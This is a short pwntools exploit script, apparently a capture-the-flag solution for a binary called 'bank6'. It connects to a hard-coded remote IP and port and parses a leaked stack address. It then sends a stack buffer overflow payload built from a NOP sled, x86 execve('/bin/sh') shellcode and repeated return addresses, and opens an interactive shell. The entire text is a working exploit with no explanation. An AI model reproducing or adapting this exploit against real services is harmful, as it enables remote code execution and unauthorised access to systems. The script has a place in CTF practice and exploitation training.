from pwn import *

shellcode = b'\x90'*3+b'\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x50\x53\x89\xE1\xB0\xB0\x2C\xA5\xCD\x80'

#io = process('./bank6')
io = remote('61.28.237.24', 30207)
print(io.recvline())
stack_addr = int(io.recvline().split()[-1], 16)

payload = shellcode+ 259*p32(stack_addr)
print(payload)

print(io.recv())
pause()
io.sendline(payload)
io.interactive()
